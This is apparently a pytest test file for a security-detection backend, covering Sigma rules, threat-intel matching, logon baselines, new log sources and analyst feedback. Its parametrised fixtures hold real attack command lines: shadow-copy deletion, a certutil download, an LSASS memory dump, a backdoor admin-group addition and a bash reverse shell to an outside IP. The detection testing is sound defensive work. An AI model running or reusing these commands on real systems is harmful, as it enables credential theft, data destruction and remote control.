"""Stage 3: Sigma rules, threat intel, behaviour baselines, analyst feedback, new log sources."""

from __future__ import annotations

import json
from datetime import datetime, timedelta, timezone
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from app.core.config import BACKEND_ROOT, get_settings
from app.detection.baseline import apply_baselines
from app.detection.engine import Detections, current, install
from app.detection.intel import load_intel
from app.detection.sigma import load_rules, parse_rule
from app.engine.mitre import map_event
from app.ingest.loader import make_context, normalize_all
from app.ingest.parsers import parse_records
from app.main import create_app
from app.models.events import Action, EventType, NormalizedEvent
from app.models.inventory import Inventory
from app.ocsf import event_to_ocsf

BUNDLED = BACKEND_ROOT / "detection" / "sigma"


def _process(cmd: str, image: str = "C:\\Windows\\System32\\cmd.exe", host: str = "HR-PC", i: int = 1) -> dict:
    return {"RecordId": f"t-{i}", "EventID": "1", "UtcTime": "2026-09-30T10:00:00Z", "Computer": host,
            "User": "CORP\\john.doe", "Image": image, "ParentImage": "C:\\Windows\\explorer.exe", "CommandLine": cmd}


def _parse(records: list[dict]) -> list[NormalizedEvent]:
    events, errors = parse_records(records, make_context(Inventory(), "test"))
    assert not errors, errors
    return normalize_all(events)


@pytest.fixture(autouse=True)
def bundled_rules():
    """Each test starts from the bundled rules, no intel, no feedback."""
    previous = current()
    detections = Detections(rules=load_rules([BUNDLED]))
    detections.reindex()
    install(detections)
    yield detections
    install(previous)


# ------------------------------------------------------------------ Sigma --

def test_all_bundled_rules_load():
    rules = load_rules([BUNDLED])
    assert len(rules.rules) == 16 and rules.skipped == []
    assert all(r.techniques for r in rules.rules)


@pytest.mark.parametrize("cmd,title,technique", [
    ('"C:\\Windows\\system32\\vssadmin.exe" delete shadows /all /quiet', "Volume Shadow Copies Deleted", "T1490"),
    ("certutil.exe -urlcache -split -f http://198.51.100.7/a.exe C:\\Users\\Public\\a.exe", "Certutil", "T1105"),
    ("certutil.exe /urlcache /f https://198.51.100.7/a.exe a.exe", "Certutil", "T1105"),  # windash
    ('schtasks /create /tn upd /tr "powershell -w hidden -f C:\\Users\\Public\\u.ps1" /sc minute', "Scheduled Task", "T1053.005"),
    ("rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Temp\\l.dmp full", "LSASS Memory Dumped", "T1003.001"),
    ("nltest /domain_trusts", "Domain Trust", "T1482"),
    ('net localgroup administrators backdoor /add', "Administrators", "T1098"),
])
def test_bundled_rules_detect_attacks(cmd, title, technique):
    event = _parse([_process(cmd)])[0]
    findings = [t for t in event.tags if t.startswith("finding:Sigma:")]
    assert any(title in f for f in findings), event.tags
    assert event.suspicious
    assert technique in {m.technique_id for m in map_event(event)}


@pytest.mark.parametrize("cmd", [
    "chrome.exe --profile-directory=Default",
    "certutil.exe -verify C:\\certs\\root.cer",           # certutil without a URL
    "schtasks /query /fo LIST",                           # schtasks without /create
    "net user john.doe",                                   # no /add
    "vssadmin list shadows",
])
def test_bundled_rules_ignore_normal_activity(cmd):
    event = _parse([_process(cmd)])[0]
    assert not any(t.startswith("sigma:") for t in event.tags)


def test_sigma_condition_grammar_and_modifiers():
    rule = parse_rule({
        "title": "t", "id": "x1", "level": "high", "tags": ["attack.execution", "attack.t1059"],
        "logsource": {"product": "windows", "category": "process_creation"},
        "detection": {
            "sel_a": {"CommandLine|contains|all": ["alpha", "beta"]},
            "sel_b": {"Image|endswith": ["\\one.exe", "\\two.exe"]},
            "filter": {"User|re": "^svc_"},
            "condition": "(1 of sel_*) and not filter",
        },
    }, "inline")
    yes = _parse([_process("x alpha y beta", image="C:\\a\\zzz.exe")])[0]
    also = _parse([_process("nothing", image="C:\\a\\TWO.EXE")])[0]  # case-insensitive
    no = _parse([_process("alpha only", image="C:\\a\\zzz.exe")])[0]
    assert rule.matches(yes) and rule.matches(also) and not rule.matches(no)
    assert rule.techniques == ["T1059"] and rule.tactics == ["execution"]


def test_unsupported_rules_are_skipped_with_a_reason(tmp_path: Path):
    (tmp_path / "agg.yml").write_text(
        "title: agg\nlogsource: {category: process_creation}\n"
        "detection:\n  sel: {Image|endswith: x.exe}\n  condition: sel | count() by Computer > 5\n", encoding="utf-8")
    (tmp_path / "b64.yml").write_text(
        "title: b64\nlogsource: {category: process_creation}\n"
        "detection:\n  sel: {CommandLine|base64offset|contains: secret}\n  condition: sel\n", encoding="utf-8")
    (tmp_path / "broken.yml").write_text("title: [unclosed", encoding="utf-8")
    rules = load_rules([tmp_path])
    reasons = " | ".join(s["reason"] for s in rules.skipped)
    assert rules.rules == [] and "aggregation" in reasons and "base64offset" in reasons and "unreadable" in reasons


# ----------------------------------------------------------------- intel --

def test_threat_intel_formats_and_matching(tmp_path: Path, bundled_rules):
    (tmp_path / "feed.json").write_text(json.dumps({"type": "bundle", "objects": [
        {"type": "indicator", "name": "Cerber C2", "pattern": "[domain-name:value = 'xmfir0.win']"},
        {"type": "indicator", "name": "Bad IP", "pattern": "[ipv4-addr:value = '45.33.32.156']"},
        {"type": "indicator", "name": "Old", "revoked": True, "pattern": "[domain-name:value = 'old.example']"},
    ]}), encoding="utf-8")
    (tmp_path / "list.csv").write_text("type,value,description\nsha256,%s,Dropper\n" % ("a" * 64), encoding="utf-8")
    (tmp_path / "plain.txt").write_text("# comment\nevil.example.org\nnot an indicator\n", encoding="utf-8")
    intel = load_intel([tmp_path])
    assert (len(intel.domains), len(intel.ips), len(intel.hashes)) == (2, 1, 1)
    bundled_rules.intel = intel
    bundled_rules.reindex()

    dns = _parse([{"ts": 1790761620.0, "query": "cerberhhyed5frqa.xmfir0.win", "id.orig_h": "10.0.1.15"}])[0]
    assert dns.suspicious and any("Cerber C2" in t for t in dns.tags)  # parent domain matches
    proc = _parse([{**_process("x.exe"), "Hashes": "MD5=00,SHA256=" + "A" * 64}])[0]
    assert any(t.startswith("intel:hash:") for t in proc.tags)
    clean = _parse([{"ts": 1790761620.0, "query": "www.microsoft.com", "id.orig_h": "10.0.1.15"}])[0]
    assert not clean.suspicious and not any(t.startswith("intel:") for t in clean.tags)


def test_reloading_detections_reverts_old_results(bundled_rules):
    event = _parse([_process("vssadmin delete shadows /all")])[0]
    assert event.suspicious and event.severity.value == "critical"
    empty = Detections()
    empty.reindex()
    install(empty)
    normalize_all([event])
    assert not event.suspicious and event.severity.value != "critical"
    assert not any(t.startswith(("sigma:", "finding:Sigma")) for t in event.tags)


# -------------------------------------------------------------- baselines --

def _logon(user: str, host: str, when: datetime, i: int) -> NormalizedEvent:
    return NormalizedEvent(event_id=f"b-{i}", timestamp=when, event_type=EventType.AUTHENTICATION,
                           action=Action.LOGIN_SUCCESS, user=user, destination_host=host, source_host=host)


def test_baselines_flag_new_host_and_unusual_hour_after_learning():
    start = datetime(2026, 9, 1, 9, tzinfo=timezone.utc)
    events = [_logon("maria", "FINANCE-PC", start + timedelta(days=d, hours=h), d * 10 + h)
              for d in range(5) for h in range(0, 9, 2)]  # 25 logons, 09:00-17:00, five days
    early = _logon("maria", "HR-PC", start + timedelta(hours=1), 900)           # new, but during learning
    new_host = _logon("maria", "FILE01", start + timedelta(days=6, hours=2), 901)
    night = _logon("maria", "FINANCE-PC", start + timedelta(days=6, hours=-6), 902)  # 03:00
    events = sorted(events + [early, new_host, night], key=lambda e: e.timestamp)
    assert apply_baselines(events, min_history=20, learning_hours=24) == 2
    assert not any(t.startswith("anomaly:") for t in early.tags)
    assert "anomaly:new-host" in new_host.tags and "anomaly:unusual-hour" in night.tags
    assert not new_host.suspicious  # evidence, not a verdict
    assert apply_baselines(events, 20, 24) == 2  # re-running does not duplicate tags
    assert new_host.tags.count("anomaly:new-host") == 1


# ------------------------------------------------------------ new sources --

def test_new_sources_are_recognised_and_mapped():
    records = [
        {"message": "CEF:0|Fortinet|FortiGate|7.2|13|traffic|3|rt=1790761620000 src=10.0.1.15 dst=45.33.32.156 dpt=4444 act=deny"},
        {"message": 'type=EXECVE msg=audit(1790761620.123:4471): argc=3 a0="bash" a1="-c" '
                    'a2="bash -i >& /dev/tcp/45.33.32.156/4444 0>&1" node=web01'},
        {"message": "type=USER_LOGIN msg=audit(1790761700.001:4480): pid=1 uid=0 msg='op=login acct=\"deploy\" "
                    "exe=\"/usr/sbin/sshd\" addr=45.33.32.156 terminal=ssh res=success' node=web01"},
        {"eventTime": "2026-10-01T10:00:00Z", "eventSource": "cloudtrail.amazonaws.com", "eventName": "StopLogging",
         "awsRegion": "us-east-1", "sourceIPAddress": "45.33.32.156", "eventID": "e1",
         "userIdentity": {"type": "IAMUser", "userName": "deploy"}, "recipientAccountId": "111122223333"},
        {"eventTime": "2026-10-01T10:01:00Z", "eventSource": "iam.amazonaws.com", "eventName": "AttachUserPolicy",
         "awsRegion": "us-east-1", "eventID": "e2", "userIdentity": {"type": "IAMUser", "userName": "deploy"},
         "requestParameters": {"policyArn": "arn:aws:iam::aws:policy/AdministratorAccess"}},
        {"id": "s1", "createdDateTime": "2026-10-01T09:00:00Z", "userPrincipalName": "maria.gomez@corp.example",
         "appDisplayName": "Exchange", "ipAddress": "45.33.32.156", "status": {"errorCode": 0},
         "riskLevelDuringSignIn": "high"},
    ]
    events = {e.event_id: e for e in _parse(records)}
    by_type = {(e.event_type.value, e.action.value) for e in events.values()}
    assert ("network", "CONNECTION_BLOCKED") in by_type and ("cloud", "CLOUD_LOGGING_DISABLED") in by_type
    assert ("authentication", "NETWORK_LOGON") in by_type and ("endpoint", "COMMAND_EXEC") in by_type
    techniques = {m.technique_id for e in events.values() for m in map_event(e)}
    assert {"T1562.008", "T1098.003", "T1078.004", "T1059.004"} <= techniques
    assert "T1059.003" not in techniques  # the Windows shell rule stays off Linux events
    login = next(e for e in events.values() if e.action is Action.NETWORK_LOGON)
    assert (login.user, login.source_ip, login.destination_host) == ("deploy", "45.33.32.156", "WEB01")
    classes = {event_to_ocsf(e)["class_uid"] for e in events.values()}
    assert {4001, 6003, 3002, 1007} <= classes


# --------------------------------------------------------------- feedback --

@pytest.fixture()
def client(monkeypatch: pytest.MonkeyPatch, tmp_path: Path):
    monkeypatch.setenv("PRISM_STORAGE_ENABLED", "true")
    monkeypatch.setenv("PRISM_STORAGE_PATH", str(tmp_path / "prism.db"))
    get_settings.cache_clear()
    with TestClient(create_app()) as test_client:
        yield test_client
    get_settings.cache_clear()


def test_detection_api(client):
    info = client.get("/api/detection").json()
    assert info["sigma"]["loaded"] == 16 and len(info["rules"]) == 16
    assert info["baseline"]["learning_hours"] == 24


def test_false_positive_feedback_suppresses_and_survives_restart(client, monkeypatch, tmp_path):
    chains = client.get("/api/attacks").json()
    assert len(chains) == 1
    result = client.post("/api/attacks/ATTACK-001/feedback",
                         json={"verdict": "false_positive", "note": "red-team exercise"}).json()
    assert result["suppressions_created"] and result["chains_now"] == 0
    events = client.get("/api/events", params={"limit": 500}).json()
    assert any((e["suppressed"] or "").startswith("analyst: ") and "red-team exercise" in e["suppressed"] for e in events)
    feedback = client.get("/api/feedback").json()
    assert feedback["verdicts"][0]["verdict"] == "false_positive"

    get_settings.cache_clear()  # restart: suppressions come back from storage
    with TestClient(create_app()) as again:
        assert again.get("/api/attacks").json() == []
        first = again.get("/api/feedback").json()["suppressions"][0]["id"]
        for entry in again.get("/api/feedback").json()["suppressions"]:
            assert again.delete(f"/api/feedback/suppressions/{entry['id']}").status_code == 200
        assert len(again.get("/api/attacks").json()) == 1  # removing them restores the chain
        assert again.delete(f"/api/feedback/suppressions/{first}").status_code == 404


def test_true_positive_feedback_is_recorded_only(client):
    result = client.post("/api/attacks/ATTACK-001/feedback", json={"verdict": "true_positive"}).json()
    assert result["suppressions_created"] == [] and result["chains_now"] == 1
    assert client.post("/api/attacks/NOPE/feedback", json={"verdict": "true_positive"}).status_code == 404


def test_routine_admin_work_stops_raising_chains_but_one_offs_do_not():
    from app.detection.baseline import mark_routine

    start = datetime(2026, 9, 1, 10, tzinfo=timezone.utc)
    routine = [NormalizedEvent(event_id=f"r-{d}", timestamp=start + timedelta(days=d), event_type=EventType.AUTHENTICATION,
                               action=Action.RDP_LOGIN, user="priya.n", source_host="IT-PC", destination_host="DC01")
               for d in range(3)]
    one_off = NormalizedEvent(event_id="x-1", timestamp=start + timedelta(days=2, hours=1),
                              event_type=EventType.AUTHENTICATION, action=Action.RDP_LOGIN, user="john.doe",
                              source_host="HR-PC", destination_host="DC01")
    flagged = NormalizedEvent(event_id="x-2", timestamp=start + timedelta(days=1), event_type=EventType.ENDPOINT,
                              action=Action.DISCOVERY_COMMAND, user="priya.n", destination_host="IT-PC",
                              command_line="nltest /domain_trusts", tags=["sigma:abc"])
    events = routine + [one_off, flagged]
    assert mark_routine(events, routine_days=3) == 3
    assert all(e.suppressed and "3 different days" in e.suppressed for e in routine)
    assert one_off.suppressed is None and flagged.suppressed is None
    assert mark_routine(events, routine_days=4) == 0 and all(e.suppressed is None for e in routine)  # recomputed


def test_sigma_wildcards_follow_the_specification():
    from app.detection.sigma import _glob

    def match(pattern: str, text: str) -> bool:
        return _glob(pattern, cased=False)(text)

    rlo = chr(0x202E)
    assert not match("*[u+202e]*", "report.exe")       # brackets are plain text, not a character set
    assert match("*[u+202e]*", "a[U+202E]b")
    assert match("*" + rlo + "*", "invoice" + rlo + "fdp.exe")
    assert match("c?t", "CAT") and not match("c?t", "cart")
    assert match("a" + chr(92) + "*b", "a*b") and not match("a" + chr(92) + "*b", "axb")  # escaped star
    assert not match("*" + chr(92) + "temp" + chr(92) + "*", "C:" + chr(92) + "Temp" + chr(92) + "x.exe")  # "\\*" is a literal star


def test_modifiers_wrap_values_ending_in_a_backslash():
    """contains '\\Temp\\' must not turn into the escaped wildcard '\\*'."""
    from app.detection.sigma import _value_matcher

    bs = chr(92)
    path = "C:" + bs + "Users" + bs + "Public" + bs + "Temp" + bs + "x.exe"
    assert _value_matcher(bs + "Temp" + bs, ["contains"])(path)
    assert _value_matcher("C:" + bs + "Users" + bs, ["startswith"])(path)
    assert _value_matcher(bs, ["contains"])(path) and not _value_matcher(bs, ["contains"])("x.exe")
    assert _value_matcher(bs + "x.exe", ["endswith"])(path)


def test_explicit_credentials_4648_is_read_from_the_source_computer():
    """4648 is logged on the computer the sign-in comes FROM and names the target server."""
    event = _parse([{"RecordId": "c-1", "EventID": "4648", "TimeCreated": "2026-09-30T10:00:00Z", "Computer": "UTICA",
                     "SubjectUserName": "dschrute", "TargetUserName": "mscott", "TargetServerName": "NEWYORK"}])[0]
    assert (event.source_host, event.destination_host, event.user) == ("UTICA", "NEWYORK", "mscott")
    assert "credential-switch:dschrute" in event.tags
    assert any("dschrute used the credentials of mscott to reach NEWYORK" in t for t in event.tags)
    local = _parse([{"RecordId": "c-2", "EventID": "4648", "TimeCreated": "2026-09-30T10:00:00Z", "Computer": "UTICA",
                     "SubjectUserName": "dschrute", "TargetUserName": "dschrute", "TargetServerName": "localhost"}])[0]
    assert local.source_host == local.destination_host == "UTICA"  # a local run-as is not movement
    assert not any(t.startswith("credential-switch:") for t in local.tags)
